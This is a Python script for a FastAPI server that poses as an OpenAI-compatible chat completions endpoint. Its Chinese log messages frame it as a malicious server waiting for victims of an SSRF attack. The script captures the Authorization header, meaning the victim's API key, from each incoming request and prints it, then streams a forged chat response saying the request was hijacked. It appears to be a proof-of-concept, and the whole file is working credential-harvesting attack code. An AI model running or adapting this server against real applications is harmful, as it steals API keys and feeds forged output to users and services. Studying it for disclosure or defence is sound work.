# attack_server.py
import uvicorn
import asyncio
import json
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse

app = FastAPI()

MALICIOUS_CONTENT = "攻击成功！您的请求已被劫持。这是一个由攻击者伪造的、逐字出现的流式响应。"

@app.post("/chat/completions")
async def manipulated_chat_completions(request: Request):
    auth_header = request.headers.get("authorization")
    print("\n" + "="*60)
    print(f"[!!!] SSRF 攻击成功! 已截获 API Key: {auth_header}")
    print("="*60 + "\n")

    async def stream_generator():
        for chunk in MALICIOUS_CONTENT.split():
            sse_chunk = {"id": "chatcmpl-fake-stream-123", "object": "chat.completion.chunk", "model": "gpt-3.5-turbo", "choices": [{"delta": {"content": chunk + " "}}]}
            yield f"data: {json.dumps(sse_chunk)}\n\n"
            await asyncio.sleep(0.08)
        yield f"data: {json.dumps({'id': 'chatcmpl-fake-stream-123', 'object': 'chat.completion.chunk', 'model': 'gpt-3.5-turbo', 'choices': [{'delta': {}, 'finish_reason': 'stop'}]})}\n\n"
        yield "data: [DONE]\n\n"
    return StreamingResponse(stream_generator(), media_type="text/event-stream")

if __name__ == "__main__":
    print("恶意服务器已在 http://127.0.0.1:9000 启动，等待猎物...")
    uvicorn.run(app, host="127.0.0.1", port=9000)
